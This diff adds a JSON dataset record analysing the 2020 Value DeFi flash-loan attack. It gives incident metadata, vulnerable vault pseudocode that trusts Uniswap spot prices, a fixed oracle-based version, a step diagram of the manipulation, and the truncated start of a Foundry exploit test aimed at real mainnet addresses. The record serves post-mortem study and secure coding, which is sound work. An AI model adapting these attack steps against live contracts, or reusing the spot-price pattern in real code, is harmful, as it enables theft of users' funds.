@@ -1,0 +1,36 @@
+{
+ "id": "2020__2020-11-14_ValueDeFi_FlashLoanOracleManipulation",
+ "source_file": "2020/2020-11-14_ValueDeFi_FlashLoanOracleManipulation.md",
+ "title": "Value DeFi — Flash Loan-Based On-Chain Oracle Manipulation Analysis",
+ "date": "2020-11-14",
+ "protocol": "Value DeFi",
+ "chain": "Ethereum Mainnet",
+ "loss_raw": "~$6,000,000 (DAI)",
+ "loss_usd": 6000000.0,
+ "root_cause": "vSafe directly used Uniswap V2 spot price without TWAP validation for deposit/withdrawal ratio calculations, enabling within-block AMM manipulation for deposit/withdrawal arbitrage",
+ "attack_tx": "0x46a0...50a (block 11,256,673)",
+ "vulnerable_contract": "0x40aF3827F39D0EAcBF4A168f8D4ee67c121D11c9 (MultiStablesVault)",
+ "classes": [
+  "flash-loan"
+ ],
+ "code_before": [
+  "❌ Vulnerable vSafe price calculation (pseudocode)\ncontract VSafe {\n\n    IUniswapV2Pair public stablecoinPair; // DAI/USDC Uniswap V2 pool\n\n    // Calculate current pool value\n    function getPoolValue() public view returns (uint256) {\n        //",
+  "❌ Direct spot price usage: easily manipulated via flash loan\n        (uint112 reserve0, uint112 reserve1,) = stablecoinPair.getReserves();\n        return (reserve0 * PRICE_DAI + reserve1 * PRICE_USDC) / 1e18;\n    }\n\n    function deposit(uint256 amount) external {\n        uint256 poolValue = getPoolValue(); //",
+  "❌ Reflects manipulated price\n\n        // Manipulated low poolValue → more shares minted\n        uint256 shares = (amount * totalShares) / poolValue;\n        totalShares += shares;\n        balances[msg.sender] += shares;\n    }\n}\n\n//"
+ ],
+ "code_after": [
+  "✅ Correct pattern\ncontract VSafeFixed {\n    function getPoolValue() public view returns (uint256) {\n        //",
+  "✅ Use Uniswap V2 TWAP or Chainlink oracle\n        return chainlinkOracle.getLatestPrice();\n    }\n}"
+ ],
+ "steps": [
+  "Inject large DAI → withdraw USDC",
+  "→ Distort DAI/USDC ratio in pool",
+  "→ DAI spot price drops",
+  "→ Acquire more vSafe shares than normal",
+  "→ Receive more DAI than deposited"
+ ],
+ "other_code": [
+  "Attacker\n    │\n    ├─[1] Borrow large amount of DAI/USDC via flash loan\n    │       (Using Uniswap, Aave, etc.)\n    │\n    ├─[2] Manipulate Uniswap V2 DAI/USDC pool\n    │       Inject large DAI → withdraw USDC\n    │       → Distort DAI/USDC ratio in pool\n    │       → DAI spot price drops\n    │\n    ├─[3] Deposit DAI into Value DeFi vSafe\n    │       Based on manipulated low DAI price\n    │       → Acquire more vSafe shares than normal\n    │\n    ├─[4] Reverse-manipulate Uniswap V2 pool\n    │       Re-inject USDC to normalize price\n    │\n    ├─[5] Redeem vSafe shares (at normal price)\n    │       → Receive more DAI than deposited\n    │\n    ├─[6] Repeat steps [2]–[5] to accumulate profit\n    │\n    └─[7] Repay flash loan + ~$6M net profit",
+  "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\n\ncontract ValueDeFiAttack is Test {\n    IUniswapV2Pair daiUsdcPair = IUniswapV2Pair(0xAE461cA67B15dc8dc81CE7615e0320dA1A9aB8D5);\n    IVSafe vSafe = IVSafe(0x40aF3827F39D0EAcBF4A168f8D4ee67c121D11c9);\n    IERC20 dai  = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);\n    IERC20 usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);\n\n    function testExploit() public {\n        // [Step 1] Borrow large amount of DAI via flash swap\n        uint256 daiLoan = 80_000_000 * 1e18; // 80 million DAI\n        daiUsdcPair.swap(daiLoan, 0, address(this), abi.encode(\"flashloan\"));\n    }\n\n    function uniswapV2Call(address, uint256 amount0, uint256, bytes calldata) external {\n        // [Step 2] Buy large a"
+ ]
+}
